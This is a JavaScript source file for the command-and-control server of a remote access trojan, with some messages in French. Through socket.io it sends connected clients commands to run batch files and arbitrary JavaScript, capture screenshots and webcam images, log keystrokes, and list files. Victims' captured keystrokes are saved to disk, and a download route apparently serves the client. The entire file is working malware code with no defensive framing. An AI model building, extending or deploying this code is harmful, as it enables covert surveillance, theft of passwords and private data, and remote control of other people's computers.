const { Tree } = require('./Tree.js')
const { Server } = require("socket.io");
const { Konsole } = require('./Konsole.js')
const colors = require('colors')
const fs = require('fs')
const express = require('express')
const app = express()

app.use('/docs', (req, res) => {
  const showdown = require('showdown')
  const markdown = new showdown.Converter()
  let md = fs.readFileSync('./readme.md', { encoding: 'utf8' })
  let html = `<body style='overflow:hidden;background: black; color: white;'>
    <div style='font-family: arial;padding:100px;width: 800px;'>${markdown.makeHtml(md)}</div>
  </body>`
  res.set('Content-Type', 'text/html');
  res.send(Buffer.from(html));
})

app.use('/dl', express.static('download'))
app.use('/', express.static('public'))
app.use('/cdn', express.static('assets'))

const server = app.listen(3000)
const io = new Server(server);

let socket_id = "none"
let konsole = new Konsole()
konsole.socket = socket_id
let socket_infos = new Map()

function freshData() {
  app.use('/sockets', (req, res) => {
    res.set('Content-Type', 'application/json');
    let data = Array.from(socket_infos)
    let string = JSON.stringify(data)
    res.send(Buffer.from(string));
  })
}

function getSocketById(id) {
  let sockets = io.sockets.sockets
  
  if (sockets.has(id)) {
    return sockets.get(id)
  }

  return false
}

app.get('/do/screenshot/:socketId', (req, res) => {
  res.set('Content-Type', 'application/json');
  io.to(req.params.socketId).emit('screen')
  let socket = getSocketById(req.params.socketId)
  
  if (socket === false) {
    res.status(400);
    return
  }
  
  socket.on("image", (buffer) => {
    res.send(Buffer.from(JSON.stringify({
      base64: `data:image/png;base64, ${buffer.toString('base64')}`
    })));
    socket.off("image")
  })
  
})

io.on('connection', socket => {

  io.to(socket.id).emit('info')
  
  if (socket_id === "none") {
    socket_id = socket.id
    konsole.socket = socket.id
  }
  
  socket.on('response', message => {
    konsole.log(message)
  })
  
  socket.on('out_keylog', array => {
    let string = array.filter(x => x.length === 1 || x === "ENTER" || x === "SPACE").join('').replaceAll('SPACE', " ").replaceAll('ENTER', '\n\n').toLowerCase()
    fs.writeFileSync(`keylogs/keylog_${socket.id}.txt`, string)
  })
  
  socket.on('socket_info', infos => {
    socket_infos.set(socket.id, infos)
  })
  
  socket.on('error', message => {
    konsole.error(message)
  })
  
  socket.on('warn', message => {
    konsole.warn(message)
  })
  
  socket.on('givefiles', function(filesArr) {
    console.log("\n" + new Tree({ sequence: filesArr, baseIndent: " " }).string.blue)
  })
})

// commands Map Settings & Definitions

let commands = new Map()

commands.set('bat', async function(str) {
  io.to(socket_id).emit('bat', str)
  konsole.startCD(2)
})

commands.set('kill', function() {
  io.to(socket_id).emit('kill')
  konsole.log('Socket correctement fermé.')
})

commands.set('info', function() {
  io.to(socket_id).emit('info')
})

commands.set('keylog', function() {
  io.to(socket_id).emit('keylog')
})

commands.set('tree', function(args = "./") {
  io.to(socket_id).emit('getfiles', args)
  konsole.startCD(3)
})

commands.set('js', function(code) {
  io.to(socket_id).emit('js', code)
  konsole.startCD(2)
})

commands.set('cam', function() {
  io.to(socket_id).emit('cam')
  konsole.startCD(2)
})

commands.set('screen', function() {
  io.to(socket_id).emit('screen')
  konsole.startCD(2)
})

freshData()